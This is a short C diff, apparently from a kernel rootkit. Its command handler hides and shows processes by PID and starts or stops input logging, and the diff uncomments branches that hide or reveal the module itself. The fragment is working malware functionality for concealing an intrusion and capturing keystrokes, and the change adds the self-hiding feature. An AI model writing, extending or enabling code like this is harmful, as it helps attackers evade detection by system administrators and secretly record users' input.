@@ -106,10 +106,10 @@ static void handleCommand(char *input) {
 		hideProcess(arg);
 	} else if (sscanf(input, "showPid %d", &arg) == 1) {
 		showProcess(arg);
-	// } else if (!strcmp(input, "showMod")) {
-	// 	moduleHide_stop();
-	// } else if (!strcmp(input, "hideMod")) {
-	// 	moduleHide_start();
+	} else if (!strcmp(input, "showMod")) {
+		moduleHide_stop();
+	} else if (!strcmp(input, "hideMod")) {
+		moduleHide_start();
 	} else if (!strcmp(input, "startLog")) {
 		logInput_init();
 	} else if (!strcmp(input, "stopLog")) {
